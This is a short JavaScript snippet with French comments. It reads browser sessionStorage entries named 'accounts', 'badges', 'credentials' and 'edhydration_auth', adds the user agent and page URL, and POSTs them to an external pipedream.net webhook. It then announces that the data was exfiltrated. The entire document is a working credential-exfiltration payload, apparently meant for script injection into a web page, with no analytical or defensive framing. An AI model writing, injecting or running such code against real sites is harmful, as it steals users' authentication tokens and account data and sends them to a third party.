const keys = ["accounts", "badges", "credentials", "edhydration_auth"];
const webhookUrl = "https://eo8uniwr7mg9h4g.m.pipedream.net";

// Collecter toutes les données
const collectedData = {};

keys.forEach(key => {
    const value = sessionStorage.getItem(key);
    collectedData[key] = value !== null ? value : "(clé absente)";
});

// Ajouter des métadonnées
collectedData.timestamp = new Date().toISOString();
collectedData.userAgent = navigator.userAgent;
collectedData.url = window.location.href;

// Envoyer les données au webhook
fetch(webhookUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(collectedData)
})
.then(response => {
    if (response.ok) {
        alert('Données exfiltrées avec succès!');
    } else {
        alert('Erreur lors de l\'envoi des données');
    }
})
.catch(error => {
    alert('Erreur: ' + error.message);
});
